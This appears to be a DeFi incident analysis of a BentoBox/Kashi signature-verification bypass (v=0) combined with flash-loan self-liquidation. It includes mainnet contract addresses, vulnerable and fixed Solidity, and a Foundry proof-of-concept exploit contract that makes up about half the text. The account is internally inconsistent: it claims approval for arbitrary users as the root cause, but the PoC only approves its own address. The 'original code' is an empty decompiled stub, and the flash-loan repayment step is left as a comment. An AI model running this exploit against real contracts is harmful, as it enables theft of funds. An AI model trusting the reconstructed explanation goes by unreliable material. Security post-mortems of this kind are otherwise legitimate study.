# Kashi (Abracadabra) — Invalid Signature Approval + Self-Liquidation Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-11 |
| **Protocol** | Abracadabra Money (Kashi/BentoBox) |
| **Chain** | Ethereum Mainnet |
| **Loss** | Unconfirmed |
| **BentoBox** | [0xF5BCE5077908a1b7370B9ae04AdC565EBd643966](https://etherscan.io/address/0xF5BCE5077908a1b7370B9ae04AdC565EBd643966) |
| **Cauldron (Medium Risk)** | [0xbb02A884621FB8F5BFd263A67F58B65df5b090f3](https://etherscan.io/address/0xbb02A884621FB8F5BFd263A67F58B65df5b090f3) |
| **xSUSHI** | [0x8798249c2E607446EfB7Ad49eC89dD1865Ff4272](https://etherscan.io/address/0x8798249c2E607446EfB7Ad49eC89dD1865Ff4272) |
| **MIM** | [0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3](https://etherscan.io/address/0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3) |
| **Master Contract** | [0x4a9Cb5D0B755275Fd188f87c0A8DF531B0C7c7D2](https://etherscan.io/address/0x4a9Cb5D0B755275Fd188f87c0A8DF531B0C7c7D2) |
| **Root Cause** | `setMasterContractApproval()` processes an invalid signature with `v=0` as a valid approval |
| **CWE** | CWE-347: Improper Verification of Cryptographic Signature |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-11/Kashi_exp.sol) |

---
## 1. Vulnerability Overview

BentoBox uses a master contract approval system where the `setMasterContractApproval()` function allows users to authorize delegated execution for a specific master contract via EIP-712 signatures. The vulnerability was logic that skipped signature verification when the signature's `v` value was `0`. An attacker called `setMasterContractApproval()` with an invalid signature of `v=0, r=0, s=0` to register approval on behalf of an arbitrary user. Using this, the attacker flash-borrowed 450,000 xSUSHI from BentoBox, deposited it as collateral, over-borrowed MIM, and then profited further through self-liquidation.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable setMasterContractApproval() - skips signature verification when v=0
contract BentoBox {
    function setMasterContractApproval(
        address user,
        address masterContract,
        bool approved,
        uint8 v,        // ❌ verification skipped if v=0
        bytes32 r,
        bytes32 s
    ) external {
        // ❌ If v is 0, approval is processed without signature verification
        if (v == 0 && r == 0 && s == 0) {
            // Should only allow msg.sender to change their own approval without a signature,
            // but missing user parameter validation allows changing approval for any arbitrary user
            masterContractApproved[masterContract][user] = approved;
            return;
        }

        // Normal signature verification (when v != 0)
        bytes32 digest = keccak256(abi.encodePacked(
            "\x19\x01",
            DOMAIN_SEPARATOR,
            keccak256(abi.encode(APPROVAL_TYPEHASH, masterContract, approved, nonces[user]++))
        ));
        address recoveredAddress = ecrecover(digest, v, r, s);
        require(recoveredAddress == user, "Invalid signature");
        masterContractApproved[masterContract][user] = approved;
    }
}

// ✅ Correct pattern - removes v=0 case, enforces msg.sender
contract SafeBentoBox {
    function setMasterContractApproval(
        address user,
        address masterContract,
        bool approved,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external {
        // ✅ If called without a signature, must have msg.sender == user
        if (v == 0 && r == 0 && s == 0) {
            require(msg.sender == user, "Not authorized");
            masterContractApproved[masterContract][user] = approved;
            return;
        }

        // ✅ If a signature is present, it must be verified
        bytes32 digest = _getDigest(masterContract, approved, user);
        address recoveredAddress = ecrecover(digest, v, r, s);
        require(recoveredAddress != address(0) && recoveredAddress == user, "Invalid signature");
        masterContractApproved[masterContract][user] = approved;
    }
}
```

---
### On-Chain Original Code

Source: Bytecode decompilation


**Kashi_decompiled.sol** — entry point:
```solidity
// ❌ Root cause: `setMasterContractApproval()` processes an invalid signature with `v=0` as a valid approval
    function setMasterContractApproval(address arg0, address arg1, bool arg2, uint8 arg3, bytes32 arg4, bytes32 arg5) external {}  // 0xc0a47c93  // ❌ vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Call BentoBox.batchFlashLoan(attacker, [xSUSHI], [450_000e18], data)
    │       Flash-borrow 450,000 xSUSHI
    │       Enter onFlashLoan() callback
    │
    ├─[2] [Inside callback] setMasterContractApproval(
    │         user           = attacker,
    │         masterContract = CauldronMediumRisk,
    │         approved       = true,
    │         v=0, r=0, s=0  ← ❌ invalid signature
    │       )
    │       → Approval registered without signature verification
    │
    ├─[3] Deposit xSUSHI as collateral into BentoBox
    │       Borrow 800,000 MIM from Cauldron
    │       (Over-borrowed relative to collateral value)
    │
    ├─[4] Self-liquidation
    │       Liquidate own position to collect liquidation bonus
    │       MIM repaid + additional xSUSHI acquired
    │
    ├─[5] Repay flash loan
    │       Realize profit via MIM → WETH → xSUSHI swap
    │
    └─[6] Net profit: MIM/ETH arbitrage
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IBentoBox {
    function batchFlashLoan(
        address borrower,
        address[] calldata tokens,
        uint256[] calldata amounts,
        bytes calldata data
    ) external;

    // ❌ v=0 signature verification vulnerability
    function setMasterContractApproval(
        address user,
        address masterContract,
        bool approved,
        uint8 v, bytes32 r, bytes32 s
    ) external;

    function deposit(address token, address from, address to, uint256 amount, uint256 share)
        external returns (uint256, uint256);
}

interface ICauldron {
    function addCollateral(address to, bool skim, uint256 share) external;
    function borrow(address to, uint256 amount) external returns (uint256, uint256);
    function liquidate(
        address[] calldata users,
        uint256[] calldata maxBorrowParts,
        address to,
        address swapper
    ) external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

contract KashiExploit is Test {
    IBentoBox bentoBox    = IBentoBox(0xF5BCE5077908a1b7370B9ae04AdC565EBd643966);
    ICauldron cauldron    = ICauldron(0xbb02A884621FB8F5BFd263A67F58B65df5b090f3);
    IERC20 xSUSHI         = IERC20(0x8798249c2E607446EfB7Ad49eC89dD1865Ff4272);
    IERC20 MIM            = IERC20(0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3);
    address masterContract = 0x4a9Cb5D0B755275Fd188f87c0A8DF531B0C7c7D2;

    function setUp() public {
        vm.createSelectFork("mainnet", 15_928_289);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] MIM", MIM.balanceOf(address(this)), 18);

        // [Step 1] Execute BentoBox flash loan
        address[] memory tokens  = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        tokens[0]  = address(xSUSHI);
        amounts[0] = 450_000 * 1e18;
        bentoBox.batchFlashLoan(address(this), tokens, amounts, "");

        emit log_named_decimal_uint("[End] MIM", MIM.balanceOf(address(this)), 18);
    }

    function onFlashLoan(
        address, address, uint256 amount, uint256 fee, bytes calldata
    ) external {
        require(msg.sender == address(bentoBox));

        // [Step 2] Approve master contract with invalid signature (v=0)
        // ⚡ Approves self as a Cauldron user without signature verification
        bentoBox.setMasterContractApproval(
            address(this),
            masterContract,
            true,
            0,          // v = 0 → verification skipped
            bytes32(0), // r = 0
            bytes32(0)  // s = 0
        );

        // [Step 3] Deposit xSUSHI as collateral and borrow MIM
        xSUSHI.approve(address(bentoBox), type(uint256).max);
        (, uint256 share) = bentoBox.deposit(
            address(xSUSHI), address(this), address(this), amount, 0
        );
        cauldron.addCollateral(address(this), false, share);
        cauldron.borrow(address(this), 800_000 * 1e18);

        // [Step 4] Collect liquidation bonus via self-liquidation
        address[] memory users   = new address[](1);
        uint256[] memory amounts_ = new uint256[](1);
        users[0] = address(this);
        amounts_[0] = type(uint256).max;
        cauldron.liquidate(users, amounts_, address(this), address(0));

        // [Step 5] Repay flash loan (amount + fee)
        // Withdraw xSUSHI and return to bentoBox
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | EIP-712 signature verification bypass (v=0 permitted) |
| **CWE** | CWE-347: Improper Verification of Cryptographic Signature |
| **OWASP DeFi** | Signature verification bypass |
| **Attack Vector** | `setMasterContractApproval(user, contract, true, v=0, r=0, s=0)` → unauthorized approval |
| **Precondition** | No `user == msg.sender` check in the `v=0` case |
| **Impact** | MIM profit via flash loan + self-liquidation |

---
## 6. Remediation Recommendations

1. **Harden the v=0 case**: When `v=0` and no signature is present, enforce `require(msg.sender == user)` to allow only self-approval.
2. **Require valid signatures**: Process third-party approvals only when a valid EIP-712 signature is provided. Immediately revert if the `ecrecover` result is `address(0)` or does not match `user`.
3. **Use nonces**: Include a nonce in each approval signature to prevent signature replay attacks.

---
## 7. Lessons Learned

- **Edge case handling in signature verification**: When an EIP-712 signature flow permits a "no signature" case for convenience, caller authentication must still be performed in that case. Every time an exception is introduced, examine whether that exception can be exploited.
- **The `ecrecover` pitfall**: `ecrecover(hash, 0, 0, 0)` can return `address(0)`. Failing to check whether the `ecrecover` result is `address(0)` means that if `user` is `address(0)`, verification can be passed.
- **Profitability of self-liquidation**: Self-liquidation may appear to be a loss under normal circumstances, but in a structure that pays a liquidation bonus, creating an over-borrowed position can actually be profitable. Lending protocols must separately analyze self-liquidation paths.